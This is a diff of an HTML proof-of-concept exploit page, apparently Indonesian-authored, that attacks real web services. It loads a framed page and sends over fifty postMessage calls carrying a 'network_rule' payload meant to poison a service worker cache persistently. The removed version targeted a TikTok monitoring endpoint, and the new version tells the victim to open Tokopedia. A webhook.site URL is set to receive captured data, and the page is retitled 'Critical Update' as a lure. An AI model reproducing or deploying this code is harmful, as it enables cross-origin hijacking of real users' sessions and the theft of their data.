@@ -1,12 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Service Verification</title>
+    <title>Critical Update</title>
 </head>
 <body style="background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px;">
-    <div style="border: 1px solid #0f0; display: inline-block; padding: 20px;">
-        <h1 id="status">[ PHASE: INITIALIZING ]</h1>
-        <p id="sub-status">Targeting Slardar Monitoring Endpoint...</p>
+    <div style="border: 2px solid #0f0; display: inline-block; padding: 30px;">
+        <h1 id="status">[ PHASE 1: TARGETING ]</h1>
+        <p id="sub-status">Initiating Cross-Origin Payload...</p>
     </div>
 
     <iframe id="pwn_gate" 
@@ -17,13 +17,15 @@
         const gate = document.getElementById('pwn_gate');
         const statusH1 = document.getElementById('status');
         const statusP = document.getElementById('sub-status');
-        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e"; // GANTI ID LU
+        
+        // GANTI DENGAN WEBHOOK LU
+        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e"; 
 
         const payload = {
             source: "main_thread",
             eventName: "network_rule",
             data: [{
-                ruleName: "slardar_config_poisoning",
+                ruleName: "cross_origin_persistent_pwn",
                 global: true,
                 conditions: [],
                 handlers: [{
@@ -36,44 +38,22 @@
         };
 
         gate.onload = function() {
-            statusH1.innerText = "[ PHASE: INJECTING ]";
-            statusP.innerText = "Bypassing PNS Logic via postMessage...";
-
-            // 1. Kirim sinyal bangun untuk Service Worker
-            gate.contentWindow.postMessage({source: "main_thread", eventName: "ready_for_msg"}, "*");
-
-            setTimeout(() => {
-                // 2. Spam payload ke Service Worker
-                let count = 0;
-                const bomb = setInterval(() => {
-                    gate.contentWindow.postMessage(payload, "*");
-                    count++;
-                    if (count > 50) {
-                        clearInterval(bomb);
-                        statusH1.innerText = "[ PHASE: PERSISTING ]";
-                        statusP.innerText = "Waiting for Cache Storage sync (10s)...";
-                        
-                        // 3. Jeda 10 detik agar penulisan cache selesai
-                        setTimeout(triggerFinal, 10000);
-                    }
-                }, 100);
-            }, 1000);
-        };
-
-        function triggerFinal() {
-            statusH1.innerText = "[ PHASE: TRIGGERING ]";
-            statusP.innerText = "Testing intercept on Slardar endpoint...";
+            statusH1.innerText = "[ PHASE 2: INJECTING ]";
+            statusP.innerText = "Poisoning Service Worker Cache...";
             
-            // 4. Trigger fetch ke endpoint yang sama (200 OK)
-            fetch("https://mon.tiktokv.com/monitor_web/settings/browser-settings", { 
-                mode: 'no-cors',
-                cache: 'no-store' 
-            }).then(() => {
-                statusH1.innerText = "[ COMPLETED ]";
-                statusP.innerText = "Verify via Reqable or Cache Storage.";
-                console.log("PoC Sequence Finished.");
-            });
-        }
+            // Mengirim payload berulang kali untuk memastikan intersep
+            let count = 0;
+            const bomb = setInterval(() => {
+                gate.contentWindow.postMessage(payload, "*");
+                count++;
+                if (count > 50) {
+                    clearInterval(bomb);
+                    statusH1.innerText = "[ PHASE 3: COMPLETED ]";
+                    statusP.innerText = "Service Worker Poisoned! Now open Tokopedia.";
+                    console.log("Poisoning sequence finished.");
+                }
+            }, 100);
+        };
     </script>
 </body>
 </html>
